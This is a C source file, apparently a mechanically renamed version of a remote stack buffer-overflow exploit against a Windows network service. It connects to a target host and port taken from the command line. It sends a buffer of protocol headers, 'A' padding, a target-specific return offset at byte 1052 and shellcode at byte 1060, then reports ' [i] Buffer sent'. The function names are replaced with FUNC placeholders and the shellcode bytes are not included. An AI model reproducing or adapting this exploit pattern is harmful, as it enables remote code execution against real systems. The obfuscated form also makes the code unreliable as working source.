#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_6__   TYPE_3__ ;
typedef  struct TYPE_5__   TYPE_2__ ;
typedef  struct TYPE_4__   TYPE_1__ ;

/* Type definitions */
struct TYPE_4__ {int /*<<< orphan*/  S_addr; } ;
struct TYPE_5__ {TYPE_1__ S_un; } ;
struct sockaddr_in {TYPE_2__ sin_addr; scalar_t__ sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  sa ;
typedef  int /*<<< orphan*/  buffer ;
typedef  int /*<<< orphan*/  WSADATA ;
typedef  scalar_t__ USHORT ;
struct TYPE_6__ {char* name; char offset; } ;
typedef  int /*<<< orphan*/  SOCKET ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 char* BOTTOMHEADER ; 
 int BUFFERLEN ; 
 int /*<<< orphan*/  INVALID_SOCKET ; 
 int /*<<< orphan*/  IPPROTO_TCP ; 
 int /*<<< orphan*/  FUNC0 (int,int) ; 
 char* MIDDLEHEADER ; 
 scalar_t__ SOCKET_ERROR ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  FUNC1 (int,char**) ; 
 char* TOPHEADER ; 
 int FUNC2 () ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC4 (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 size_t FUNC5 (char*) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC7 (int /*<<< orphan*/ ,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC8 (int) ; 
 scalar_t__ FUNC9 (size_t) ; 
 int /*<<< orphan*/  FUNC10 (char*) ; 
 scalar_t__ FUNC11 (int) ; 
 int /*<<< orphan*/  FUNC12 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC13 (char*,char,int) ; 
 int /*<<< orphan*/  FUNC14 (char*,...) ; 
 int /*<<< orphan*/  FUNC15 (int /*<<< orphan*/ ,char*,int,int /*<<< orphan*/ ) ; 
 char* shellcode ; 
 int FUNC16 (char*) ; 
 TYPE_3__* supported ; 

int FUNC17(int argc, char *argv[]) {
   SOCKET s;
   
   WSADATA HWSAdata;
   struct  sockaddr_in sa;

   char *buffer=NULL;

   FUNC1(argc,argv);

   if (FUNC4(FUNC0(2,2), &HWSAdata) != 0) { 
      FUNC14("\n [e] Error: WSAStartup():%d\n", FUNC2()); 
      FUNC8(1); 
   }

   if ((s=FUNC3(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0))==INVALID_SOCKET){ 
      FUNC14("\n [e] Error: socket():%d\n", FUNC2()); 
      FUNC8(1); 
   }

   sa.sin_family           = AF_INET;
   sa.sin_port             = (USHORT)FUNC9(FUNC5(argv[2]));
   sa.sin_addr.S_un.S_addr = FUNC10(argv[1]);

   if ( FUNC7(s, (struct sockaddr *) &sa, sizeof(sa)) == SOCKET_ERROR ) { 
      FUNC14("\n [e] Error: connect()"); 
      FUNC8(1); 
   }

   FUNC14(" [i] Connected : Yes\n");
   FUNC14(" [i] Target    : %s\n",supported[FUNC5(argv[3])].name);

   buffer=(char*)FUNC11(FUNC16(TOPHEADER)+BUFFERLEN+FUNC16(MIDDLEHEADER)+FUNC16(argv[1])+1+FUNC16(argv[2])+FUNC16(BOTTOMHEADER)+1); 
   FUNC13(buffer,0,sizeof(buffer));

   FUNC12(buffer,TOPHEADER,FUNC16(TOPHEADER));

   FUNC13(buffer+FUNC16(TOPHEADER),'A',BUFFERLEN);

   FUNC12(buffer+FUNC16(TOPHEADER)+1052,&supported[FUNC5(argv[3])].offset,sizeof(long));

   FUNC12(buffer+FUNC16(TOPHEADER)+1060,shellcode,FUNC16(shellcode));

   FUNC12(buffer+BUFFERLEN,MIDDLEHEADER,FUNC16(MIDDLEHEADER));
   FUNC12(buffer+BUFFERLEN+FUNC16(MIDDLEHEADER),argv[1],FUNC16(argv[1]));
   FUNC12(buffer+BUFFERLEN+FUNC16(MIDDLEHEADER)+FUNC16(argv[1]),":",FUNC16(":"));
   FUNC12(buffer+BUFFERLEN+FUNC16(MIDDLEHEADER)+FUNC16(argv[1])+FUNC16(":"),argv[2],FUNC16(argv[2]));
   FUNC12(buffer+BUFFERLEN+FUNC16(MIDDLEHEADER)+FUNC16(argv[1])+FUNC16(":")+FUNC16(argv[2]),BOTTOMHEADER,FUNC16(BOTTOMHEADER));

   FUNC15(s,buffer,FUNC16(buffer),0);

   FUNC14(" [i] Buffer sent\n\n");

   FUNC6(s);

}